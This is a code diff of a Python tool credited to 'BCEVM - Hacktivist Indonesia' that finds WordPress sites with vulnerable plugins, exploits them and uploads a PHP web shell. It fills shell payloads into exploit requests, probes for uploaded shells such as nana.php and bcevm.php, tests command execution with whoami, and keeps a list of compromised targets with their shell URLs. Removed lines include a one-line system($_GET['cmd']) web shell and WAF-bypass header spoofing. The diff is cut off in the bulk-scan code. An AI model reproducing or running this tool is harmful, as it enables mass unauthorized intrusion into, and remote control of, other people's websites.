@@ -1,7 +1,6 @@
 #!/usr/bin/env python3
 """
-WordPress Advanced Security Scanner & Exploiter v5.3
-WITH LOCAL SHELL FILE SUPPORT
+WordPress Advanced Security Scanner & Exploiter v6.0 - FINAL
 Tools by BCEVM - Hacktivist Indonesia
 """
 
@@ -12,618 +11,468 @@ import re
 import sys
 import json
 import time
-import hashlib
-import random
-import string
-from urllib.parse import urlparse, urlencode, quote, unquote
-from datetime import datetime
-from colorama import init, Fore, Style, Back
-import concurrent.futures
 import base64
+from urllib.parse import urlparse, urlencode, quote
+from datetime import datetime
+from colorama import init, Fore, Style
+import concurrent.futures
 
 requests.packages.urllib3.disable_warnings()
 init(autoreset=True)
 
 BANNER = f"""
-{Fore.RED}╔══════════════════════════════════════════════════════════════╗
-║{Fore.YELLOW}    ██████╗  ██████╗███████╗██╗   ██╗███╗   ███╗    {Fore.RED}       ║
-║{Fore.YELLOW}    ██╔══██╗██╔════╝██╔════╝██║   ██║████╗ ████║    {Fore.RED}       ║
-║{Fore.YELLOW}    ██████╔╝██║     █████╗  ██║   ██║██╔████╔██║    {Fore.RED}       ║
-║{Fore.YELLOW}    ██╔══██╗██║     ██╔══╝  ██║   ██║██║╚██╔╝██║    {Fore.RED}       ║
-║{Fore.YELLOW}    ██████╔╝╚██████╗███████╗╚██████╔╝██║ ╚═╝ ██║    {Fore.RED}       ║
-║{Fore.CYAN}      WordPress Security Scanner v5.3 (Local Shell)      {Fore.RED}║
-║{Fore.WHITE}         Support upload from local file (nana.php)      {Fore.RED}║
-║{Fore.GREEN}              Tools by BCEVM - Hacktivist Indonesia      {Fore.RED}║
-╚══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
+{Fore.RED}{'═' * 70}
+{Fore.RED}╔{Fore.YELLOW}══════════════════════════════════════════════════════════════{Fore.RED}╗
+{Fore.RED}║{Fore.YELLOW}    ██████╗  ██████╗███████╗██╗   ██╗███╗   ███╗    {Fore.RED}      ║
+{Fore.RED}║{Fore.YELLOW}    ██╔══██╗██╔════╝██╔════╝██║   ██║████╗ ████║    {Fore.RED}      ║
+{Fore.RED}║{Fore.YELLOW}    ██████╔╝██║     █████╗  ██║   ██║██╔████╔██║    {Fore.RED}      ║
+{Fore.RED}║{Fore.YELLOW}    ██╔══██╗██║     ██╔══╝  ██║   ██║██║╚██╔╝██║    {Fore.RED}      ║
+{Fore.RED}║{Fore.YELLOW}    ██████╔╝╚██████╗███████╗╚██████╔╝██║ ╚═╝ ██║    {Fore.RED}      ║
+{Fore.RED}║{Fore.CYAN}      WordPress Security Scanner v6.0 (Final Edition)      {Fore.RED}║
+{Fore.RED}║{Fore.WHITE}              Real Exploit Detection + Shell Upload        {Fore.RED}║
+{Fore.RED}║{Fore.GREEN}              Tools by BCEVM - Hacktivist Indonesia       {Fore.RED}║
+{Fore.RED}╚{Fore.YELLOW}══════════════════════════════════════════════════════════════{Fore.RED}╝
+{Fore.RED}{'═' * 70}{Style.RESET_ALL}
 """
 
-# Path ke exploit_db.json
 EXPLOIT_DB_PATH = "exploits/exploit_db.json"
 
 def load_exploit_db(json_path=EXPLOIT_DB_PATH):
-    """Load exploit database from JSON file"""
     if os.path.exists(json_path):
         try:
             with open(json_path, 'r') as f:
                 db = json.load(f)
-            print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Loaded {len(db)} plugins from {json_path}")
+            print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Loaded {len(db)} plugins")
             return db
-        except Exception as e:
-            print(f"{Fore.YELLOW}[!]{Style.RESET_ALL} Error loading {json_path}: {e}")
+        except:
             return {}
     else:
-        print(f"{Fore.YELLOW}[!]{Style.RESET_ALL} {json_path} not found!")
-        print(f"{Fore.YELLOW}[!]{Style.RESET_ALL} Creating directory exploits/ ...")
         os.makedirs("exploits", exist_ok=True)
         return {}
 
 def load_shell_file(shell_path):
-    """Load shell content from local file"""
     if os.path.exists(shell_path):
-        try:
-            with open(shell_path, 'rb') as f:
-                content = f.read()
-            print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Loaded shell from: {shell_path} ({len(content)} bytes)")
-            return content
-        except Exception as e:
-            print(f"{Fore.RED}[-]{Style.RESET_ALL} Error loading shell: {e}")
-            return None
-    else:
-        print(f"{Fore.RED}[-]{Style.RESET_ALL} Shell file not found: {shell_path}")
-        return None
-
-def get_shell_content(shell_file=None, shell_content=None):
-    """Get shell content from file or parameter"""
-    if shell_file:
-        return load_shell_file(shell_file)
-    elif shell_content:
-        if shell_content.startswith("base64:"):
-            return base64.b64decode(shell_content[7:])
-        return shell_content.encode()
-    else:
-        # Default shell
-        default_shell = b"<?php system($_GET['cmd']); ?>"
-        print(f"{Fore.YELLOW}[!]{Style.RESET_ALL} No shell provided, using default")
-        return default_shell
+        with open(shell_path, 'rb') as f:
+            content = f.read()
+        print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Loaded shell: {shell_path} ({len(content)} bytes)")
+        return content
+    print(f"{Fore.RED}[-]{Style.RESET_ALL} Shell not found: {shell_path}")
+    return None
 
 class WordPressScanner:
-    def __init__(self, target, shell_file=None, shell_content=None, exploit_db_path=EXPLOIT_DB_PATH, timeout=25, threads=3):
-        self.target = self.normalize_target(target)
-        self.domain = self.extract_domain(target)
+    def __init__(self, target, shell_file=None, timeout=15):
+        self.target = self._normalize(target)
+        self.domain = self._extract_domain(target)
         self.timeout = timeout
-        self.threads = threads
-        self.shell_content = get_shell_content(shell_file, shell_content)
-        self.shell_b64 = base64.b64encode(self.shell_content).decode()
-        self.EXPLOIT_DB = load_exploit_db(exploit_db_path)
+        self.shell_content = load_shell_file(shell_file) if shell_file else None
+        self.shell_b64 = base64.b64encode(self.shell_content).decode() if self.shell_content else ""
+        self.EXPLOIT_DB = load_exploit_db()
         
         self.session = requests.Session()
-        self.session.headers.update({
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9",
-            "Accept-Language": "en-US,en;q=0.5",
-            "Accept-Encoding": "gzip, deflate, br",
-            "Connection": "keep-alive"
-        })
+        self.session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"})
         self.session.verify = False
+        
         self.results = {
             "target": self.target,
             "wordpress": False,
             "version": None,
             "plugins": [],
-            "vulnerable_plugins": [],
             "vulnerabilities": [],
-            "exploits": [],
-            "shells": [],
-            "credentials": [],
-            "waf_detected": False,
-            "has_vulnerabilities": False
+            "successful_exploits": [],
+            "shells": []
         }
-        self.vulnerable = False
+        self.has_vuln = False
     
-    def normalize_target(self, url):
-        if not url.startswith("http"):
+    def _normalize(self, url):
+        if not url.startswith(("http://", "https://")):
             url = "http://" + url
         return url.rstrip("/")
     
-    def extract_domain(self, url):
-        parsed = urlparse(url)
-        return parsed.netloc or parsed.path
+    def _extract_domain(self, url):
+        return urlparse(url).netloc
     
-    def http_request(self, url, method="GET", data=None, files=None, headers=None, allow_redirects=True, bypass_waf=False):
-        """HTTP request dengan WAF bypass techniques"""
+    def _request(self, url, method="GET", data=None):
         try:
-            request_headers = self.session.headers.copy()
-            if headers:
-                request_headers.update(headers)
-            
-            if bypass_waf:
-                bypass_headers = {
-                    "X-Forwarded-For": "127.0.0.1",
-                    "X-Real-IP": "127.0.0.1",
-                    "X-Originating-IP": "127.0.0.1",
-                    "X-Remote-IP": "127.0.0.1",
-                    "X-Remote-Addr": "127.0.0.1",
-                    "X-Client-IP": "127.0.0.1",
-                    "Referer": self.target,
-                    "Origin": self.target
-                }
-                request_headers.update(bypass_headers)
-            
-            if method.upper() == "GET":
-                r = self.session.get(url, timeout=self.timeout, 
-                                   allow_redirects=allow_redirects, headers=request_headers)
-            elif method.upper() == "POST":
-                r = self.session.post(url, data=data, files=files, 
-                                    timeout=self.timeout, allow_redirects=allow_redirects, 
-                                    headers=request_headers)
+            if method == "GET":
+                r = self.session.get(url, timeout=self.timeout)
             else:
-                return "", 0, {}
-            
-            return r.text, r.status_code, r.headers
-        except Exception as e:
-            return f"Error: {str(e)[:50]}", 0, {}
+                r = self.session.post(url, data=data, timeout=self.timeout)
+            return r.text, r.status_code
+        except:
+            return "", 0
     
     def detect_wordpress(self):
-        """WordPress detection"""
-        print(f"{Fore.CYAN}[*]{Style.RESET_ALL} Detecting WordPress...")
-        
-        wp_indicators = []
-        protocols = ["http://", "https://"]
-        base_domain = self.domain
-        
-        for protocol in protocols:
-            test_url = protocol + base_domain
-            html, status, _ = self.http_request(test_url)
-            
-            if status > 0:
-                self.target = test_url.rstrip("/")
-                
-                patterns = [
-                    (r'/wp-content/|/wp-includes/|/wp-json/', "Path references"),
-                    (r'wordpress|WordPress', "WordPress mention"),
-                    (r'id="wp-"|class="wp-', "WP classes"),
-                    (r'content=["\']WordPress', "Generator meta")
-                ]
-                
-                for pattern, desc in patterns:
-                    if re.search(pattern, html, re.IGNORECASE):
-                        wp_indicators.append(desc)
-                
-                if wp_indicators:
-                    break
-        
-        check_paths = ["/wp-login.php", "/wp-admin/", "/xmlrpc.php", "/readme.html"]
-        for path in check_paths:
-            url = self.target + path
-            _, status, _ = self.http_request(url)
-            if status in [200, 301, 302, 403, 401]:
-                wp_indicators.append(path)
-        
-        self.results["wordpress"] = len(wp_indicators) >= 2
-        return wp_indicators
+        print(f"{Fore.BLUE}[*]{Style.RESET_ALL} Detecting WordPress...")
+        paths = ["/wp-login.php", "/wp-admin/", "/wp-content/"]
+        for path in paths:
+            _, status = self._request(self.target + path)
+            if status in [200, 403, 302]:
+                self.results["wordpress"] = True
+                print(f"{Fore.GREEN}[+]{Style.RESET_ALL} WordPress detected!")
+                return True
+        return False
     
-    def get_wp_version(self):
-        """Get WordPress version"""
-        sources = [
-            (self.target + "/readme.html", r'Version\s+([\d.]+)'),
-            (self.target + "/feed/", r'generator>https://wordpress\.org/\?v=([\d.]+)<'),
-            (self.target, r'content="WordPress\s+([\d.]+)"')
-        ]
-        
-        for url, pattern in sources:
-            html, status, _ = self.http_request(url)
-            if status == 200:
-                match = re.search(pattern, html, re.IGNORECASE)
-                if match:
-                    version = match.group(1)
-                    if re.match(r'^\d+(\.\d+)+$', version):
-                        self.results["version"] = version
-                        return version
-        return None
+    def get_version(self):
+        html, _ = self._request(self.target + "/readme.html")
+        match = re.search(r'Version\s+([\d.]+)', html)
+        if match:
+            self.results["version"] = match.group(1)
+            print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Version: {self.results['version']}")
     
     def find_plugins(self):
-        """Find plugins"""
-        print(f"{Fore.CYAN}[*]{Style.RESET_ALL} Discovering plugins...")
-        
-        html, _, _ = self.http_request(self.target)
-        plugins = set()
-        
-        plugin_patterns = [
-            r'/wp-content/plugins/([^/"\'>]+)/',
-            r'plugins=([^&"\'>]+)'
-        ]
-        
-        for pattern in plugin_patterns:
-            matches = re.findall(pattern, html, re.IGNORECASE)
-            for match in matches:
-                plugin = match.lower().strip()
-                if plugin and '.' not in plugin and len(plugin) < 30:
-                    plugins.add(plugin)
-        
-        for plugin in self.EXPLOIT_DB.keys():
-            check_url = f"{self.target}/wp-content/plugins/{plugin}/"
-            _, status, _ = self.http_request(check_url)
-            if status in [200, 301, 302, 403]:
-                plugins.add(plugin)
-        
-        self.results["plugins"] = sorted(list(plugins))
-        return self.results["plugins"]
+        print(f"{Fore.BLUE}[*]{Style.RESET_ALL} Discovering plugins...")
+        html, _ = self._request(self.target)
+        plugins = set(re.findall(r'/wp-content/plugins/([^/"\'>]+)/', html, re.I))
+        self.results["plugins"] = sorted(plugins)
+        print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Found {len(plugins)} plugins")
+        return plugins
     
-    def check_vulnerabilities(self):
-        """Check vulnerabilities - hanya yang ada di DB"""
-        vulnerabilities = []
-        vulnerable_plugins = []
-        
+    def check_vulns(self):
+        print(f"{Fore.BLUE}[*]{Style.RESET_ALL} Checking vulnerabilities...")
+        vulns = []
         for plugin in self.results["plugins"]:
-            plugin_name = plugin.split()[0].lower()
-            
-            if plugin_name in self.EXPLOIT_DB:
-                vulnerable_plugins.append(plugin_name)
-                for cve in self.EXPLOIT_DB[plugin_name].get("cves", []):
-                    vulnerabilities.append({
-                        "plugin": plugin_name,
-                        "cve": cve[0] if isinstance(cve, tuple) else cve.get("id", "Unknown"),
-                        "severity": cve[1] if isinstance(cve, tuple) else cve.get("severity", "MEDIUM"),
-                        "description": cve[2] if isinstance(cve, tuple) else cve.get("description", "")
+            if plugin in self.EXPLOIT_DB:
+                for cve in self.EXPLOIT_DB[plugin].get("cves", []):
+                    vulns.append({
+                        "plugin": plugin,
+                        "cve": cve.get("id", "Unknown"),
+                        "severity": cve.get("severity", "MEDIUM")
                     })
-        
-        self.results["vulnerable_plugins"] = vulnerable_plugins
-        self.results["vulnerabilities"] = vulnerabilities
-        self.results["has_vulnerabilities"] = len(vulnerabilities) > 0
-        self.vulnerable = len(vulnerabilities) > 0
-        
-        return vulnerabilities
+        self.results["vulnerabilities"] = vulns
+        self.has_vuln = len(vulns) > 0
+        if vulns:
+            print(f"{Fore.RED}[!]{Style.RESET_ALL} Found {len(vulns)} vulnerabilities")
+        else:
+            print(f"{Fore.GREEN}[+]{Style.RESET_ALL} No vulnerabilities")
+        return vulns
     
-    def exploit_with_waf_bypass(self, plugin_name, exploit_name=None):
-        """Advanced exploitation dengan shell dari file"""
+    def exploit_plugin(self, plugin_name):
+        """Exploit plugin dan return URL shell jika berhasil"""
         if plugin_name not in self.EXPLOIT_DB:
-            return False
+            return None
         
         exploits = self.EXPLOIT_DB[plugin_name].get("exploits", [])
+        if not exploits:
+            return None
         
-        if exploit_name:
-            exploit = next((e for e in exploits if e["name"] == exploit_name), None)
-            if not exploit:
-                return False
-            exploits = [exploit]
-        
-        successful = []
-        
-        for exploit in exploits:
-            print(f"\n{Fore.YELLOW}[!]{Style.RESET_ALL} Testing: {exploit['name']} ({exploit.get('type', 'unknown').upper()})")
+        for exploit in exploits[:2]:  # Max 2 exploits per plugin
+            print(f"\n{Fore.YELLOW}[!]{Style.RESET_ALL} Testing: {exploit.get('name', plugin_name)}")
             
             url = self.target + exploit.get("path", "/")
             method = exploit.get("method", "GET")
-            bypass = exploit.get("waf_bypass", False)
-            
-            # Update payload dengan shell content
             params = exploit.get("params", {}).copy()
             
-            # Replace shell placeholders
-            for key, value in params.items():
-                if isinstance(value, str):
-                    params[key] = value.replace("{{SHELL_B64}}", self.shell_b64)
-                    params[key] = params[key].replace("{{SHELL_CONTENT}}", self.shell_content.decode('utf-8', errors='ignore'))
+            # Ganti placeholder shell
+            for k, v in params.items():
+                if isinstance(v, str):
+                    v = v.replace("{{SHELL_B64}}", self.shell_b64)
+                    v = v.replace("{{SHELL_CONTENT}}", self.shell_content.decode() if self.shell_content else "")
+                    params[k] = v
             
             try:
                 if method == "POST":
-                    files = exploit.get("files", {}).copy()
-                    # Update files dengan shell content
-                    for field, file_info in files.items():
-                        if isinstance(file_info, tuple) and len(file_info) >= 2:
-                            filename, content, mime = file_info
-                            if content == "{{SHELL_CONTENT}}":
-                                files[field] = (filename, self.shell_content, mime)
-                    
-                    headers = exploit.get("headers", {})
-                    
-                    if files:
-                        content, status, _ = self.http_request(
-                            url, method="POST", data=params, 
-                            files=files, headers=headers, bypass_waf=bypass
-                        )
-                    else:
-                        content, status, _ = self.http_request(
-                            url, method="POST", data=params, 
-                            headers=headers, bypass_waf=bypass
-                        )
+                    content, status = self._request(url, "POST", data=params)
                 else:
                     if params:
-                        query = urlencode(params, quote_via=quote)
-                        url_full = f"{url}?{query}"
-                    else:
-                        url_full = url
-                    
-                    headers = exploit.get("headers", {})
-                    content, status, _ = self.http_request(url_full, headers=headers, bypass_waf=bypass)
+                        q = urlencode(params)
+                        url = f"{url}?{q}"
+                    content, status = self._request(url)
                 
-                print(f"  URL: {url_full if 'url_full' in locals() else url}")
-                print(f"  Status: {status}, Length: {len(content)}")
+                print(f"  {Fore.CYAN}├──{Style.RESET_ALL} Status: {status}")
+                print(f"  {Fore.CYAN}├──{Style.RESET_ALL} Length: {len(content)}")
                 
-                # Check success indicators
-                success = False
+                # HANYA SIMPAN JIKA STATUS 200
+                if status != 200:
+                    print(f"  {Fore.CYAN}└──{Style.RESET_ALL} {Fore.RED}[✗] Failed (HTTP {status}){Style.RESET_ALL}")
+                    continue
+                
+                # Cek indikator sukses
                 indicators = exploit.get("success_indicators", [])
-                for indicator in indicators:
-                    if indicator.lower() in content.lower():
-                        success = True
-                        print(f"  {Fore.GREEN}[+]{Style.RESET_ALL} Indicator found: '{indicator}'")
-                        break
+                success = any(i.lower() in content.lower() for i in indicators)
                 
-                result = {
+                if not success:
+                    print(f"  {Fore.CYAN}└──{Style.RESET_ALL} {Fore.RED}[✗] No indicators found{Style.RESET_ALL}")
+                    continue
+                
+                print(f"  {Fore.CYAN}└──{Style.RESET_ALL} {Fore.GREEN}[✓] EXPLOIT SUCCESSFUL!{Style.RESET_ALL}")
+                
+                # Cari URL shell dari response
+                shell_url = self._extract_shell_url(content, url)
+                
+                if not shell_url:
+                    # Coba cari di lokasi umum
+                    shell_url = self._find_shell()
+                
+                if shell_url:
+                    # Verifikasi shell benar-benar working
+                    if self._verify_shell(shell_url):
+                        self.results["shells"].append(shell_url)
+                        print(f"\n{Fore.GREEN}{'='*50}")
+                        print(f"  🐚 SHELL UPLOADED SUCCESSFULLY!")
+                        print(f"  📍 URL: {shell_url}")
+                        print(f"  🔧 Test: {shell_url}?cmd=whoami")
+                        print(f"{'='*50}{Style.RESET_ALL}")
+                        return shell_url
+                
+                # Simpan exploit yang berhasil
+                self.results["successful_exploits"].append({
                     "plugin": plugin_name,
-                    "exploit": exploit["name"],
-                    "url": url_full if 'url_full' in locals() else url,
-                    "method": method,
-                    "status": status,
-                    "length": len(content),
-                    "success": success
-                }
+                    "exploit": exploit.get("name"),
+                    "url": url,
+                    "status": status
+                })
                 
-                self.results["exploits"].append(result)
-                
-                if success:
-                    successful.append(result)
-                    print(f"  {Fore.GREEN}[✓]{Style.RESET_ALL} EXPLOIT SUCCESSFUL!")
-                    
-                    # Cari shell yang terupload
-                    self.find_uploaded_shells()
+                return True
                 
             except Exception as e:
-                print(f"{Fore.RED}[-]{Style.RESET_ALL} Error: {str(e)[:50]}")
+                print(f"  {Fore.CYAN}└──{Style.RESET_ALL} {Fore.RED}Error: {str(e)[:50]}{Style.RESET_ALL}")
         
-        return len(successful) > 0
+        return None
     
-    def find_uploaded_shells(self):
-        """Cari shell yang mungkin sudah terupload"""
-        print(f"{Fore.CYAN}[*]{Style.RESET_ALL} Checking for uploaded shells...")
-        
-        shell_names = ["shell.php", "nana.php", "bcevm.php", "cmd.php", "rce.php"]
-        locations = [
-            "/wp-content/uploads/",
-            "/wp-content/uploads/2025/",
-            "/wp-content/uploads/2024/",
-            "/wp-content/plugins/",
-            "/"
+    def _extract_shell_url(self, content, request_url):
+        """Extract shell URL from response"""
+        patterns = [
+            r'(https?://[^\s"\'<>]+\.php)',
+            r'url":"([^"]+\.php)"',
+            r'path":"([^"]+\.php)"',
+            r'file":"([^"]+\.php)"'
         ]
-        
-        found = False
-        for location in locations:
-            for shell in shell_names:
-                url = self.target + location + shell
-                content, status, _ = self.http_request(f"{url}?cmd=echo+SHELL_TEST")
-                
-                if status == 200 and ('SHELL_TEST' in content or '<?php' in content):
-                    print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Shell found: {url}")
-                    self.results["shells"].append({
-                        "url": url,
-                        "test": f"{url}?cmd=whoami",
-                        "verified": True
-                    })
-                    found = True
-        
-        if not found:
-            print(f"{Fore.YELLOW}[!]{Style.RESET_ALL} No shell found in common locations")
-        
-        return found
+        for pattern in patterns:
+            match = re.search(pattern, content)
+            if match:
+                url = match.group(1)
+                if not url.startswith("http"):
+                    url = self.target + url
+                return url
+        return None
     
-    def scan_all(self):
-        """Complete scan"""
-        print(f"{Fore.CYAN}[*]{Style.RESET_ALL} Starting comprehensive scan...")
-        print(f"{Fore.WHITE}[=]{Style.RESET_ALL} Target: {self.target}")
+    def _find_shell(self):
+        """Cari shell di lokasi umum"""
+        shell_names = ["shell.php", "nana.php", "bcevm.php"]
+        locations = ["/wp-content/uploads/", "/wp-content/uploads/2025/", "/wp-content/plugins/", "/"]
         
-        indicators = self.detect_wordpress()
-        if not self.results["wordpress"]:
-            print(f"{Fore.RED}[-]{Style.RESET_ALL} WordPress not detected")
+        for loc in locations:
+            for name in shell_names:
+                url = self.target + loc + name
+                content, status = self._request(f"{url}?cmd=echo+test")
+                if status == 200 and ("test" in content or "<?php" in content):
+                    return url
+        return None
+    
+    def _verify_shell(self, url):
+        """Verifikasi shell benar-benar bisa eksekusi command"""
+        test_cmds = ["whoami", "id", "echo OK"]
+        for cmd in test_cmds:
+            content, status = self._request(f"{url}?cmd={cmd}")
+            if status == 200 and len(content) > 0 and "error" not in content.lower():
+                return True
+        return False
+    
+    def scan(self):
+        """Main scan dengan progress"""
+        print(f"\n{Fore.CYAN}{'═' * 70}")
+        print(f"  🎯 TARGET: {self.target}")
+        print(f"{'═' * 70}{Style.RESET_ALL}")
+        
+        if not self.detect_wordpress():
+            print(f"{Fore.RED}[-]{Style.RESET_ALL} Not a WordPress site")
             return self.results
         
-        print(f"{Fore.GREEN}[+]{Style.RESET_ALL} WordPress detected")
-        
-        version = self.get_wp_version()
-        if version:
-            print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Version: {version}")
-        
-        plugins = self.find_plugins()
-        print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Plugins found: {len(plugins)}")
-        
-        vulns = self.check_vulnerabilities()
-        if vulns:
-            print(f"\n{Fore.RED}[!]{Style.RESET_ALL} VULNERABILITIES FOUND: {len(vulns)}")
-            for vuln in vulns:
-                color = Fore.RED if vuln["severity"] in ["CRITICAL", "HIGH"] else Fore.YELLOW
-                print(f"  {color}• {vuln['plugin']}: {vuln['cve']} ({vuln['severity']}){Style.RESET_ALL}")
-        else:
-            print(f"\n{Fore.GREEN}[+]{Style.RESET_ALL} No vulnerable plugins found")
+        self.get_version()
+        self.find_plugins()
+        self.check_vulns()
         
         return self.results
     
-    def generate_report(self):
-        """Generate report untuk vulnerable target"""
-        if not self.vulnerable:
+    def save_report(self):
+        """Simpan report hanya jika ada vuln"""
+        if not self.has_vuln and not self.results["shells"]:
             return None
         
         timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-        filename = f"reports/{self.domain}_{timestamp}_vuln.txt"
         os.makedirs("reports", exist_ok=True)
+        filename = f"reports/{self.domain}_{timestamp}.txt"
         
-        report = [
-            "=" * 70,
-            "BCEVM WordPress Security Scan - VULNERABLE TARGET REPORT",
-            f"Scan Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
+        lines = [
+            "═" * 70,
+            "BCEVM WordPress Security Scan - VULNERABLE TARGET",
+            f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
             f"Target: {self.target}",
-            "=" * 70,
+            "═" * 70,
             "",
-            "[VULNERABILITIES]",
+            "🔴 VULNERABILITIES FOUND",
+            "─" * 40,
         ]
         
-        for vuln in self.results['vulnerabilities']:
-            report.append(f"• {vuln['plugin']} - {vuln['cve']} ({vuln['severity']})")
+        for v in self.results["vulnerabilities"]:
+            lines.append(f"  • {v['plugin']} - {v['cve']} [{v['severity']}]")
         
-        if self.results['exploits']:
-            successful = [e for e in self.results['exploits'] if e.get('success')]
-            if successful:
-                report.extend(["", "[SUCCESSFUL EXPLOITS]"])
-                for exp in successful:
-                    report.append(f"✓ {exp['plugin']}/{exp['exploit']}")
-                    report.append(f"  URL: {exp['url']}")
+        if self.results["successful_exploits"]:
+            lines.extend(["", "✅ SUCCESSFUL EXPLOITS", "─" * 40])
+            for e in self.results["successful_exploits"]:
+                lines.append(f"  • {e['plugin']}/{e['exploit']}")
+                lines.append(f"    URL: {e['url']}")
         
-        if self.results['shells']:
-            report.extend(["", "[UPLOADED SHELLS]"])
-            for shell in self.results['shells']:
-                report.append(f"• {shell['url']}")
+        if self.results["shells"]:
+            lines.extend(["", "🐚 SHELL ACCESS", "─" * 40])
+            for s in self.results["shells"]:
+                lines.append(f"  • {s}")
+                lines.append(f"    Test: {s}?cmd=whoami")
         
-        report.extend([
-            "",
-            "=" * 70,
-            f"⚠️ VULNERABLE - {len(self.results['vulnerabilities'])} vulnerabilities found",
-            "=" * 70
-        ])
+        lines.extend(["", "═" * 70])
         
         with open(filename, 'w') as f:
-            f.write("\n".join(report))
+            f.write("\n".join(lines))
         
         print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Report saved: {filename}")
         return filename
-    
-    def save_vulnerable_target(self, master_file="vulnerable_targets.json"):
-        """Simpan target vulnerable ke master file"""
-        if not self.vulnerable:
-            return False
-        
-        master_data = []
-        if os.path.exists(master_file):
-            try:
-                with open(master_file, 'r') as f:
-                    master_data = json.load(f)
-            except:
-                pass
-        
-        entry = {
-            "target": self.target,
-            "domain": self.domain,
-            "timestamp": datetime.now().isoformat(),
-            "vulnerabilities": self.results.get("vulnerabilities", []),
-            "exploits_successful": len([e for e in self.results.get("exploits", []) if e.get("success")]),
-            "has_shell": len(self.results.get("shells", [])) > 0
-        }
-        
-        # Remove duplicate
-        master_data = [t for t in master_data if t.get("target") != self.target]
-        master_data.append(entry)
-        
-        with open(master_file, 'w') as f:
-            json.dump(master_data, f, indent=2)
-        
-        print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Saved to {master_file}")
-        return True
 
 def main():
     print(BANNER)
     
-    parser = argparse.ArgumentParser(
-        description="BCEVM WordPress Security Scanner v5.3",
-        formatter_class=argparse.RawDescriptionHelpFormatter,
-        epilog="""
-Examples:
-  # Scan with local shell file (nana.php)
-  python3 scanner.py https://target.com --shell nana.php --exploit
-  
-  # Scan multiple targets
-  python3 scanner.py -f targets.txt --shell nana.php
-  
-  # Use custom shell content
-  python3 scanner.py https://target.com --shell-content "<?php system($_GET['cmd']); ?>"
-  
-  # Just scan (no exploit)
-  python3 scanner.py https://target.com --scan
-        """
-    )
-    
+    parser = argparse.ArgumentParser(description="WordPress Security Scanner v6.0")
     parser.add_argument("target", nargs="?", help="Target URL")
-    parser.add_argument("-f", "--file", help="Scan targets from file")
-    parser.add_argument("--shell", "--shell-file", dest="shell_file", 
-                       help="Local shell file to upload (e.g., nana.php)")
-    parser.add_argument("--shell-content", help="Shell content as string")
-    parser.add_argument("--scan", action="store_true", help="Scan only")
+    parser.add_argument("-f", "--file", help="File containing targets")
+    parser.add_argument("--shell", help="Shell file to upload (e.g., nana.php)")
     parser.add_argument("--exploit", action="store_true", help="Exploit vulnerabilities")
-    parser.add_argument("--brute", action="store_true", help="Brute force login")
-    parser.add_argument("--list-vulns", action="store_true", help="List vulnerable targets")
-    
+    parser.add_argument("--list", action="store_true", help="List vulnerable targets")
     
     args = parser.parse_args()
     
-    # List vulnerable targets
-    if args.list_vulns:
+    if args.list:
         if os.path.exists("vulnerable_targets.json"):
             with open("vulnerable_targets.json", 'r') as f:
                 targets = json.load(f)
-            print(f"\n{Fore.CYAN}[*]{Style.RESET_ALL} Vulnerable Targets: {len(targets)}\n")
+            print(f"\n{Fore.CYAN}📋 VULNERABLE TARGETS ({len(targets)}){Style.RESET_ALL}\n")
             for i, t in enumerate(targets, 1):
                 print(f"{Fore.RED}[{i}]{Style.RESET_ALL} {t['target']}")
-                print(f"    Vulns: {len(t.get('vulnerabilities', []))}")
+                print(f"    Shell: {'✅' if t.get('has_shell') else '❌'}")
+                if t.get('shells'):
+                    for s in t['shells']:
+                        print(f"    └── {s}")
                 print()
         else:
-            print(f"{Fore.YELLOW}[!]{Style.RESET_ALL} No vulnerable targets file")
+            print(f"{Fore.YELLOW}[!]{Style.RESET_ALL} No vulnerable targets found")
         return
     
-    # Handle file input
+    # Single target
+    if args.target:
+        scanner = WordPressScanner(args.target, shell_file=args.shell)
+        scanner.scan()
+        
+        if scanner.has_vuln and args.exploit:
+            for vuln in scanner.results["vulnerabilities"]:
+                scanner.exploit_plugin(vuln["plugin"])
+        
+        scanner.save_report()
+        
+        # Save to master list
+        if scanner.has_vuln or scanner.results["shells"]:
+            master = []
+            if os.path.exists("vulnerable_targets.json"):
+                with open("vulnerable_targets.json", 'r') as f:
+                    master = json.load(f)
+            
+            # Remove duplicate
+            master = [t for t in master if t.get("target") != args.target]
+            master.append({
+                "target": args.target,
+                "timestamp": datetime.now().isoformat(),
+                "vulns": len(scanner.results["vulnerabilities"]),
+                "has_shell": len(scanner.results["shells"]) > 0,
+                "shells": scanner.results["shells"]
+            })
+            
+            with open("vulnerable_targets.json", 'w') as f:
+                json.dump(master, f, indent=2)
+        
+        print(f"\n{Fore.CYAN}{'═' * 70}")
+        if scanner.results["shells"]:
+            print(f"{Fore.GREEN}✅ TARGET VULNERABLE - SHELL UPLOADED!{Style.RESET_ALL}")
+            for s in scanner.results["shells"]:
+                print(f"   🐚 {s}")
+        elif scanner.has_vuln:
+            print(f"{Fore.RED}⚠️ TARGET VULNERABLE{Style.RESET_ALL}")
+        else:
+            print(f"{Fore.GREEN}✅ TARGET CLEAN{Style.RESET_ALL}")
+        print(f"{'═' * 70}{Style.RESET_ALL}")
+        return
+    
+    # Multi-target scan
     if args.file:
         if not os.path.exists(args.file):
-            print(f"{Fore.RED}[!]{Style.RESET_ALL} File not found: {args.file}")
+            print(f"{Fore.RED}[-]{Style.RESET_ALL} File not found")
             return
         
         with open(args.file, 'r') as f:
             targets = [line.strip() for line in f if line.strip()]
         
-        print(f"{Fore.CYAN}[*]{Style.RESET_ALL} Scanning {len(targets)} targets...")
+        print(f"\n{Fore.CYAN}{'═' * 70}")
+        print(f"  📁 BULK SCAN MODE")
